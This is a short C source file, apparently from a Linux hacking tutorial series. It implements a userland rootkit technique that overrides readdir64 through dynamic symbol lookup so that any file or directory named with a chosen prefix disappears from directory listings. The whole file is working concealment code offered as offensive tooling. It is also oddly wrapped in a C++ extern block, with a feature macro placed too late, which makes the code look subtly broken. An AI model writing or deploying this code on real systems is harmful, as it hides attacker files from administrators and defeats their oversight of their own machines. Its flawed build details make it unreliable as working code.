extern "C" {
/*
 * hide.c
 * hides directory entries whose name starts with "arbitrary_marker"
 * author: @cocomelonc
 * https://cocomelonc.github.io/linux/2026/10/26/linux-hacking-12.html
 */

#define _GNU_SOURCE
#include <dirent.h>
#include <dlfcn.h>
#include <errno.h>
#include <string.h>

#define HIDE_PREFIX "arbitrary_marker"

static struct dirent64 *(*real_entry)(DIR *);

__attribute__((constructor))
static void hide_init(void) {
  dlerror();
  real_entry = (struct dirent64 *(*)(DIR *))dlvsym(RTLD_NEXT, "readdir64", "GLIBC_2.2.5");
  if (dlerror() != NULL) {
    real_entry = NULL;
  }
}

struct dirent64 *readdir64(DIR *dir) {
  if (real_entry == NULL) {
    errno = ENOSYS;
    return NULL;
  }

  for (;;) {
    struct dirent64 *entry = real_entry(dir);
    if (entry == NULL) {
      return NULL;
    }

    if (strncmp(entry->d_name, HIDE_PREFIX, strlen(HIDE_PREFIX)) == 0) {
      continue; // skip this entry, fetch the next one
    }

    return entry;
  }
}
}
